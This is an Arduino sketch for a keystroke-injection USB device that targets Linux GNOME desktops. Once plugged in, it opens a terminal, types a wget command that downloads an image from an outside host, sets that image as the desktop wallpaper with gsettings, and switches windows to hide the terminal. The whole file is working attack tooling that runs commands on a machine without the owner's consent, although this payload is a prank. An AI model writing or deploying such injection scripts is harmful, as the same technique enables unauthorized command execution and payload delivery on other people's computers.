void setup() {
  Keyboard.begin();
delay(3000);
    
Keyboard.press(KEY_LEFT_CTRL);
Keyboard.press(KEY_LEFT_ALT);
Keyboard.press('t');
Keyboard.releaseAll();
delay(500);
Keyboard.print("wget http://chotkiypatsa.zzz.com.ua/jpg.jpg");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();

Keyboard.print("gsettings set org.gnome.desktop.background picture-uri file:///home/$(users)/jpg.jpg");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();

Keyboard.press(KEY_LEFT_ALT);
Keyboard.press(KEY_TAB);
Keyboard.releaseAll();
delay(500);






Keyboard.end();
}
void type(int key, boolean release) {
  Keyboard.press(key);
  if(release)
    Keyboard.release(key);
}
void print(const __FlashStringHelper *value) {
  Keyboard.print(value);
}
void loop(){}
